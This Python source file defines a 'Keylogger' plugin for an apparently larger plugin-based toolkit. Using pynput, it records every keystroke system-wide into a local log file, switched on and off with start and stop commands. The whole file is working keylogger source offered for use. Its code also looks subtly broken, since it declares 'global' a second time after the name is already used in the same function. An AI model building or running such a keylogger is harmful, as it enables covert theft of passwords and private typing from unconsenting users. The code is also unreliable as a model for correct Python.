from core.plugin_base import PluginBase
import threading
import os

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

# Global variable to control the keylogger thread
keylogger_listener = None

class KeyloggerPlugin(PluginBase):
    @property
    def name(self): return "Keylogger"
    @property 
    def description(self): return "Captures keystrokes to a local log file. Use 'start' or 'stop' command. Requires pynput."

    def run(self, logfile="keylog.txt", **kwargs):
        if not keyboard:
            return "pynput not installed. Run: pip install pynput"

        command = kwargs.get('command', 'start').lower()

        if command == 'start':
            global keylogger_listener
            if keylogger_listener and keylogger_listener.running:
                return "Keylogger is already running."
            
            def on_press(key):
                with open(logfile, "a") as f:
                    try: f.write(str(key.char))
                    except AttributeError: f.write(f"<{key}>")
            keylogger_listener = keyboard.Listener(on_press=on_press)
            keylogger_listener.start()
            return f"Keylogger started, logging to {os.path.abspath(logfile)}"
        elif command == 'stop':
            global keylogger_listener
            if keylogger_listener and keylogger_listener.running:
                keylogger_listener.stop()
                keylogger_listener = None
                return "Keylogger stopped."
            return "Keylogger is not running."
        else:
            return "Invalid command. Use 'start' or 'stop'."

def get_plugin():
    return KeyloggerPlugin()
